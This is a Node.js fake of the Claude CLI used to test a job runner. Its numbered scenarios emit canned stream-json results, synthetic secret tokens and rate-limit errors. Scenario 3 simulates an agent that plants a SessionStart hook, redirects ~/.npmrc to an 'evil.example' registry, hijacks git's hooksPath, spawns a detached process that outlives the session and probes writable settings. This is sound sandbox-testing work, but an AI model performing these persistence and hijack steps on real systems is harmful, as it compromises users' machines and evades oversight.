#!/usr/bin/env node
// A stand-in for `claude -p … --output-format stream-json` (architect note on #468, decision 13). The first item number
// in the prompt picks the scenario, so a spec chooses one through Run now's `items` and nothing else reaches the job.
import { execFileSync, spawn } from 'node:child_process';
import { existsSync, mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

const args = process.argv.slice(2);
const flag = (name) => {
  const at = args.indexOf(name);
  return at === -1 ? undefined : args[at + 1];
};
const prompt = flag('-p') ?? '';
const scenario = Number(/#(\d+)/.exec(prompt)?.[1] ?? '1');
const pluginRoot = /at (\/\S+) \(read-only\)/.exec(prompt)?.[1] ?? '';
const home = process.env.HOME ?? '';
const out = (value) => process.stdout.write(`${JSON.stringify(value)}\n`);
const say = (text) => out({ type: 'assistant', message: { content: [{ type: 'text', text }] } });
const result = (text, extra = {}) =>
  out({
    type: 'result',
    subtype: 'success',
    is_error: false,
    result: text,
    total_cost_usd: 0.0123,
    num_turns: 3,
    duration_ms: 1500,
    ...extra,
  });
const writable = (path) => {
  try {
    writeFileSync(path, 'swapped');
    return true;
  } catch {
    return false;
  }
};
// Synthetic secret shapes, built at run time like the specs' sentinels (CLAUDE.md, gitleaks).
const planted = [
  process.env.TC_JOB_TOKEN ?? '',
  `tce_${'E'.repeat(43)}`,
  `sk-ant-api03-${'A'.repeat(40)}`,
  `ghs_${'G'.repeat(36)}`,
];

out({ type: 'system', subtype: 'init', model: flag('--model'), settings: flag('--settings') !== undefined });

switch (scenario) {
  case 1:
    say(`env: ${Object.keys(process.env).sort().join(',')}`);
    out({
      type: 'assistant',
      message: { content: [{ type: 'tool_use', name: 'Bash', input: { command: 'ls' } }] },
    });
    result('Done: nothing to do');
    break;
  case 2:
    say(`tokens ${planted.join(' ')}`);
    process.stderr.write(`stderr ${planted.join(' ')}\n`);
    result(`summary ${planted.join(' ')}`);
    break;
  case 3: {
    mkdirSync(join(home, '.claude'), { recursive: true });
    writeFileSync(
      join(home, '.claude', 'settings.json'),
      JSON.stringify({
        hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'touch /tmp/tcr-planted' }] }] },
      }),
    );
    writeFileSync(join(home, '.npmrc'), 'registry=https://evil.example/\n');
    writeFileSync(join(home, '.gitconfig'), '[core]\n\thooksPath = /tmp/tcr-hooks\n');
    execFileSync('git', ['config', 'core.hooksPath', '/tmp/tcr-hooks']);
    const child = spawn(process.execPath, ['-e', 'setInterval(() => {}, 1000)'], {
      detached: true,
      stdio: 'ignore',
    });
    child.unref();
    const settings = flag('--settings') ?? '';
    result(
      `planted pid=${String(child.pid)} settings-writable=${String(writable(settings))} plugin-writable=${String(writable(join(pluginRoot, 'README.md')))}`,
    );
    break;
  }
  case 4: {
    const dirty = [
      join(home, '.claude', 'settings.json'),
      join(home, '.npmrc'),
      join(home, '.gitconfig'),
    ].filter((path) => existsSync(path));
    let hooksPath = '';
    try {
      hooksPath = execFileSync('git', ['config', '--get', 'core.hooksPath']).toString().trim();
    } catch {
      // Exit 1: the key is not set, which is what the verification wants.
    }
    if (hooksPath !== '') {
      dirty.push('core.hooksPath');
    }
    result(
      dirty.length === 0 ? 'clean' : `dirty: ${dirty.join(', ')}`,
      dirty.length === 0 ? {} : { is_error: true },
    );
    process.exitCode = dirty.length === 0 ? 0 : 1;
    break;
  }
  case 5:
    out({
      type: 'result',
      subtype: 'success',
      is_error: true,
      result: `Claude AI usage limit reached|${String(Math.floor(Date.now() / 1000) + 3600)}`,
      total_cost_usd: 0.5,
      num_turns: 7,
    });
    process.exitCode = 1;
    break;
  case 6:
    process.stderr.write('API Error: 429 {"type":"error","error":{"type":"rate_limit_error"}}\n');
    process.exitCode = 1;
    break;
  case 7:
    say('working for a long time');
    setInterval(() => undefined, 1000);
    break;
  default:
    process.stderr.write('boom\n');
    process.exitCode = 3;
}
